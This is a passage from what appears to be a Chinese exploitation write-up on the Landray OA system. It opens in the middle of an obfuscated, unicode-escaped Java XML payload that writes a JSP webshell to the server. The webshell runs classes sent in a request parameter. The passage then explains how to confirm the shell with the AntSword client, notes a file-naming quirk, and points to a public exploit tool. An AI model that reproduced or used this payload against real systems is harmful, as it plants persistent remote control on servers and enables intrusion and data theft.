77\u006f\u0067\u0049\u0043\u0041\u0067\u0064\u0048\u004a\u0035\u0049\u0048\u0073\u004b\u0049\u0043\u0041\u0067\u0049\u0043\u0041\u0067\u0059\u006d\u0046\u007a\u005a\u0054\u0059\u0030\u0050\u0055\u004e\u0073\u0059\u0058\u004e\u007a\u004c\u006d\u005a\u0076\u0063\u006b\u0035\u0068\u0062\u0057\u0055\u006f\u0049\u006d\u0070\u0068\u0064\u006d\u0045\u0075\u0064\u0058\u0052\u0070\u0062\u0043\u0035\u0043\u0059\u0058\u004e\u006c\u004e\u006a\u0051\u0069\u004b\u0054\u0073\u004b\u0049\u0043\u0041\u0067\u0049\u0043\u0041\u0067\u0054\u0032\u004a\u0071\u005a\u0057\u004e\u0030\u0049\u0047\u0052\u006c\u0059\u0032\u0039\u006b\u005a\u0058\u0049\u0067\u0050\u0053\u0042\u0069\u0059\u0058\u004e\u006c\u004e\u006a\u0051\u0075\u005a\u0032\u0056\u0030\u0054\u0057\u0056\u0030\u0061\u0047\u0039\u006b\u004b\u0043\u004a\u006e\u005a\u0058\u0052\u0045\u005a\u0057\u004e\u0076\u005a\u0047\u0056\u0079\u0049\u0069\u0077\u0067\u0062\u006e\u0056\u0073\u0062\u0043\u006b\u0075\u0061\u0057\u0035\u0032\u0062\u0032\u0074\u006c\u004b\u0047\u004a\u0068\u0063\u0032\u0055\u0032\u004e\u0043\u0077\u0067\u0062\u006e\u0056\u0073\u0062\u0043\u006b\u0037\u0043\u0069\u0041\u0067\u0049\u0043\u0041\u0067\u0049\u0048\u005a\u0068\u0062\u0048\u0056\u006c\u0049\u0044\u0030\u0067\u004b\u0047\u004a\u0035\u0064\u0047\u0056\u0062\u0058\u0053\u006c\u006b\u005a\u0057\u004e\u0076\u005a\u0047\u0056\u0079\u004c\u006d\u0064\u006c\u0064\u0045\u004e\u0073\u0059\u0058\u004e\u007a\u004b\u0043\u006b\u0075\u005a\u0032\u0056\u0030\u0054\u0057\u0056\u0030\u0061\u0047\u0039\u006b\u004b\u0043\u004a\u006b\u005a\u0057\u004e\u0076\u005a\u0047\u0055\u0069\u004c\u0043\u0042\u0075\u005a\u0058\u0063\u0067\u0051\u0032\u0078\u0068\u0063\u0033\u004e\u0062\u0058\u0053\u0042\u0037\u0049\u0046\u004e\u0030\u0063\u006d\u006c\u0075\u005a\u0079\u0035\u006a\u0062\u0047\u0046\u007a\u0063\u0079\u0042\u0039\u004b\u0053\u0035\u0070\u0062\u006e\u005a\u0076\u0061\u0032\u0055\u006f\u005a\u0047\u0056\u006a\u0062\u0032\u0052\u006c\u0063\u0069\u0077\u0067\u0062\u006d\u0056\u0033\u0049\u0045\u0039\u0069\u0061\u006d\u0056\u006a\u0064\u0046\u0074\u0064\u0049\u0048\u0073\u0067\u0063\u0033\u0052\u0079\u0049\u0048\u0030\u0070\u004f\u0077\u006f\u0067\u0049\u0043\u0041\u0067\u0066\u0053\u0042\u006a\u0059\u0058\u0052\u006a\u0061\u0043\u0041\u006f\u0052\u0058\u0068\u006a\u005a\u0058\u0042\u0030\u0061\u0057\u0039\u0075\u0049\u0047\u0056\u006c\u004b\u0053\u0042\u0037\u0066\u0051\u006f\u0067\u0049\u0048\u0030\u004b\u0049\u0043\u0042\u0079\u005a\u0058\u0052\u0031\u0063\u006d\u0034\u0067\u0064\u006d\u0046\u0073\u0064\u0057\u0055\u0037\u0043\u006e\u0030\u004b\u004a\u0054\u0034\u004b\u0050\u0043\u0055\u004b\u0055\u0033\u0052\u0079\u0061\u0057\u0035\u006e\u0049\u0047\u004e\u0073\u0063\u0079\u0041\u0039\u0049\u0048\u004a\u006c\u0063\u0058\u0056\u006c\u0063\u0033\u0051\u0075\u005a\u0032\u0056\u0030\u0055\u0047\u0046\u0079\u0059\u0057\u0031\u006c\u0064\u0047\u0056\u0079\u004b\u0043\u004a\u007a\u0064\u0033\u0070\u0068\u0063\u0053\u0049\u0070\u004f\u0077\u0070\u0070\u005a\u0069\u0041\u006f\u0059\u0032\u0078\u007a\u0049\u0043\u0045\u0039\u0049\u0047\u0035\u0031\u0062\u0047\u0077\u0070\u0049\u0048\u0073\u004b\u0049\u0043\u0042\u0075\u005a\u0058\u0063\u0067\u0051\u0030\u0039\u004e\u0055\u0045\u0046\u0055\u0053\u0055\u004a\u004d\u0052\u0053\u0068\u0030\u0061\u0047\u006c\u007a\u004c\u006d\u0064\u006c\u0064\u0045\u004e\u0073\u0059\u0058\u004e\u007a\u004b\u0043\u006b\u0075\u005a\u0032\u0056\u0030\u0051\u0032\u0078\u0068\u0063\u0033\u004e\u004d\u0062\u0032\u0046\u006b\u005a\u0058\u0049\u006f\u004b\u0053\u006b\u0075\u0059\u0032\u0039\u0074\u0063\u0047\u0039\u007a\u0059\u0057\u004a\u0070\u0062\u0047\u006c\u0030\u0065\u0053\u0068\u007a\u0059\u0032\u0046\u0075\u004b\u0047\u004e\u0073\u0063\u0079\u006b\u0070\u004c\u006d\u0035\u006c\u0064\u0030\u006c\u0075\u0063\u0033\u0052\u0068\u0062\u006d\u004e\u006c\u004b\u0043\u006b\u0075\u005a\u0058\u0046\u0031\u0059\u0057\u0078\u007a\u004b\u0047\u0035\u006c\u0064\u0079\u0042\u0050\u0059\u006d\u0070\u006c\u0059\u0033\u0052\u0062\u0058\u0058\u0074\u0079\u005a\u0058\u0046\u0031\u005a\u0058\u004e\u0030\u004c\u0048\u004a\u006c\u0063\u0033\u0042\u0076\u0062\u006e\u004e\u006c\u0066\u0053\u006b\u0037\u0043\u006e\u0030\u004b\u004a\u0054\u0034\u003d\u0022\u0029\u0029\u003b\u0066\u006f\u0075\u0074\u002e\u0063\u006c\u006f\u0073\u0065\u0028\u0029</string></void></void></java>
```

用蚁剑连接测试一下验证是否写入成功

PS: 这里有一个奇怪的点就是写入的`webshell`的名字必须是以`login`开头的，其他自定义的好像能写入但是连接不了

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nOibDPbcPalA5nrOLbwekgmOYfydpkfwuZsyzGvLJaUUkbGYxrNBQZyHEtM91hQaMytBQXe5ic4zHSQ/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nOibDPbcPalA5nrOLbwekgmOicKaPsqGw2lWjysq716ibIgEZmJCgax2WibX96wxGcewQsSreuGvqicJgQ/640?wx_fmt=jpeg)

当然针对于这个漏洞的利用，`poc`编写的方法不止一种，还有很多其他的方法。如果只是单纯的想利用漏洞的话，推荐一款好用的工具。

```
https://github.com/yuanhaiGreg/LandrayExploit
```